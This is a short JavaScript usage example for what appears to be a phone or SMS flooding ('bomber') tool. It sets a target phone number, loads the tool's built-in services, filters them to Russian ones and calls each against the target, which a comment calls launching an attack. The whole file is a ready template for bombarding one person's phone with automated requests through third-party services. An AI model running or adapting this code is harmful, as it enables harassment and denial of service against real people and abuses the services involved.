import Manager from "../src/lib/manager";
import Service from "../src/lib/service";

const target = "+79551234567";

// Creating a service
const service = new Service({
	country: "RU",
	process: () => {},
});

// Working without a manager
(async function withoutManager() {
	// We can check if the phone belongs to the selected country
	service.checkPhone(target);

	// Initiating a service call
	await service.init(target);
})();

// Working with a manager
(async function withManager() {
	const manager = new Manager();

	// We can download built-in services
	await manager.loadServices();

	// Adding your service to the manager
	manager.add(service);

	// Filter services by country, and launch an attack
	manager.list.filter((x) => x.countryCode === "RU").map((x) => x.init(target));
})();
